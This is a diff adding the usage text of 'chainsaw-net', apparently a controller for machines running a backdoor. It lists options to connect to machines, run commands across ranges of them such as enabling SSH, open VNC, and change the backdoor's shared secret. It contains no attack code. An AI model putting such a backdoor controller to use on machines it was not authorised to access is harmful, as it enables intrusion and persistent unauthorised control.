@@ -1,0 +1,23 @@
+chainsaw-net.
+
+csn [-c <target>] [-C <target> <command>] [-P <target>] [-b <new_secret>] [-v <target>]
+
+  -h         Displays this help message.
+  -c         Connect to machine - e.g.:
+               csn -c 12
+
+  -C         Run a command in certain machine(s) - e.g.:
+               csn -C 5-10 systemctl enable ssh --now
+               csn -C 4 ifconfig | grep inet
+
+  -P         Checks machine(s) connection - e.g.:
+               csn -P 4
+               csn -P 1-8 -f
+
+  -v         Vnc viewer - e.g.:
+               csn -v 6
+
+  -b         See or update keyword used for connections secret in backdoor's file and manager.
+
+Made by wesuRage.
+github.com/wesuRage
